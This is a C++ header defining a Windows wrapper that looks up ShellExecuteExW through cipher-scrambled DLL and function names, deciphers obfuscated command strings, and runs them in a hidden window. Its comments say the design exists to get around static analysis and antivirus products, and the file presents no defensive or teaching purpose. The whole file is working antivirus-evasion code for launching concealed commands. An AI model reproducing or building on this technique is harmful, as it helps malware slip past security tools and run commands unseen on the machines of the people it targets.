#pragma once
#include <phnt_windows.h>
#include <phnt.h>
#include <shellapi.h>
#include <mutex>
#include "ExportInterface.hpp"

// Interface for shell32.dll functions
class ShellWrapper {
public:
    BOOL IReady = FALSE;

    ShellWrapper() :
        lpShellExec(sf.LoadAndFindSingleExport("sdh.le2ll3l", "ScheuextWlEexlE")),
        mtx()
    {
        if (lpShellExec != nullptr)
            IReady = TRUE;
    }

    const void Execute(LPCSTR lpFile, LPCSTR lpVerb, LPCSTR lpParameters)
    {
		std::lock_guard<std::mutex> lock(this->mtx);
        
        // Definitions
        LPWSTR lpSys32 = new WCHAR[MAX_PATH]; // System directory pointer
        SHELLEXECUTEINFOW shexInfo;
        HRESULT hres;

        // Initialize shexInfo members
        shexInfo.cbSize = sizeof(shexInfo);
        shexInfo.hwnd = NULL;
        shexInfo.hProcess = NULL;
        shexInfo.dwHotKey = NULL;
        shexInfo.hIcon = NULL;
        shexInfo.lpClass = NULL;
        shexInfo.hMonitor = NULL;
        shexInfo.lpIDList = NULL;
        shexInfo.nShow = SW_HIDE;
        shexInfo.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
        shexInfo.lpDirectory = lpSys32;

        // Get the system directory
#ifdef _M_X86
        bIsWow64 = _Is64BitOS();
        if (!bIsWow64)
        {
            GetSystemDirectory(lpSys32, MAX_PATH);
        }
        else
        {
            GetWindowsDirectory(lpSys32, MAX_PATH);
            wcscat(lpSys32, L"\\Sysnative\00");
        }
#else
        GetSystemDirectoryW(lpSys32, MAX_PATH);

#endif
        ILog("Got system directory: %ls\n", lpSys32);
        
        // Declare conversion variables
        char* cFile;
        char* cVerb;
        char* cParams;
        wchar_t* lpwParams;
        wchar_t* lpwVerb;
        wchar_t* lpwFile;

        // Initializations
        cFile = new CHAR[strlen(lpFile) + 1];
        lpwFile = new WCHAR[(strlen(lpFile) + 1) * sizeof(wchar_t)];
        cVerb = new CHAR[strlen(lpVerb) + 1];
        lpwVerb = new WCHAR[(strlen(lpVerb) + 1) * sizeof(wchar_t)];
        cParams = new CHAR[strlen(lpParameters) + 1];
        lpwParams = new WCHAR[(strlen(lpParameters) + 1) * sizeof(wchar_t)];

        // Zero them out
		ZeroMemory(cFile, strlen(lpFile) + 1);
		ZeroMemory(lpwFile, (strlen(lpFile) + 1) * sizeof(wchar_t));
		ZeroMemory(cVerb, strlen(lpVerb) + 1);
		ZeroMemory(lpwVerb, (strlen(lpVerb) + 1) * sizeof(wchar_t));
		ZeroMemory(cParams, strlen(lpParameters) + 1);
		ZeroMemory(lpwParams, (strlen(lpParameters) + 1) * sizeof(wchar_t));

        // Decipher file name
        sf.railfence_decipher(5, lpFile, cFile);
        if (MultiByteToWideChar(CP_ACP, 0, cFile, -1, lpwFile, (strlen(cFile) + 1) * 2) == 0)
        {
            ILog("Failed to convert file name to wide char\n");
            goto cleanup;
        }

        // Decipher verb
        sf.railfence_decipher(5, lpVerb, cVerb);
        if (MultiByteToWideChar(CP_ACP, 0, cVerb, -1, lpwVerb, (strlen(cVerb) + 1) * 2) == 0)
        {
            ILog("Failed to convert verb to wide char\n");
            goto cleanup;
        }

        // Decipher parameters
        sf.railfence_decipher(5, lpParameters, cParams);
        if (MultiByteToWideChar(CP_ACP, 0, cParams, -1, lpwParams, (strlen(cParams) + 1) * 2) == 0)
        {
            ILog("Failed to convert parameters to wide char\n");
            goto cleanup;
        }

        
        // Set them in the structure
        shexInfo.lpFile = lpwFile;
        shexInfo.lpVerb = lpwVerb;
        shexInfo.lpParameters = lpwParams;

        
        ILog("Executing: %ls %ls\n", shexInfo.lpFile, shexInfo.lpParameters);


        // Execute
		hres = CoInitializeEx(NULL, COINIT_MULTITHREADED | COINIT_DISABLE_OLE1DDE);
        ShellExecuteExW(&shexInfo);
        if(hres)
			CoUninitialize();

		// Wait for the process to finish
        if (shexInfo.hProcess)
        {
            switch (WaitForSingleObject(shexInfo.hProcess, 1000))
            {
                case WAIT_OBJECT_0:
                    ILog("Process was executed and terminated normally\n");
                    break;
                case WAIT_FAILED:
                case WAIT_TIMEOUT:
                default:
                    ILog("Process timed out\n");
                    break;
            }
        }
        if ((int)shexInfo.hInstApp <= 32)
        {
            ILog("ShellExecute failed: 0x%d 0x%d\n", (int)shexInfo.hInstApp, GetLastError());
            switch ((int)shexInfo.hInstApp)
            {
                case 2:
                    ILog("File not found\n");
                    break;
                case 3:
                    ILog("Path not found\n");
					break;
                case 5:
                    ILog("Access denied\n");
                    break;
                case 8:
                    ILog("Out of memory\n");
                    break;
                case 32:
                    ILog("DLL dependency not met\n");
                    break;
                case 26:
                    ILog("Open in another process without appropriate share access\n");
                    break;
                case 27:
                case 31:
                    ILog("File association incomplete or unavailable\n");
                    break;
                case 28:
                case 29:
                case 30:
                    ILog("DDE failure\n");
                    break;
                default:
                    ILog("Unknown error\n");
                    break;
            }
        }
        
        // Call destructor
        cleanup:
        delete[] cFile;
        delete[] lpwFile;
        delete[] cVerb;
        delete[] lpwVerb;
        delete[] cParams;
        delete[] lpwParams;
        delete[] lpSys32;
        
    }

    // Accesses KUSER_SHARED_DATA using its conventional, hardcoded-by-the-kernel
    // address of 0x7FFE0000
    bool   _Is64BitOS(void) {

        // 0x7FFE026C corresponds to the NtMajorVersion field
        uintptr_t version = *(uintptr_t*)0x7FFE026C;

        // Access SysCall field with the correct offset for the OS version
        uintptr_t address = version == 10 ? 0x7FFE0308 : 0x7FFE0300;

        // On AMD64, this value is initialized to a nonzero value if the system 
        // operates with an altered view of the system service call mechanism.
        ILog("Running %u-bit system\n", *(uintptr_t**)address ? 32 : 64);

        return (*(void**)address ? false : true);
    };

private:
    // Definitions
    BOOL   bIsWow64 = false;     // Is the OS 64-bit?
    IExport sf;            // stealthFinder object
	std::mutex mtx;	   // Mutex for thread safety

    // ShellExecuteExW redefinition
    // This is the only way to get around static analysis and AVs that block ShellExecuteExW
    LPVOID lpShellExec = nullptr;
    BOOL(WINAPI* ShellExecuteExW)(_Inout_ SHELLEXECUTEINFOW* pExecInfo) =
        (BOOL(WINAPI*)(_Inout_ SHELLEXECUTEINFOW * pExecInfo))lpShellExec;

};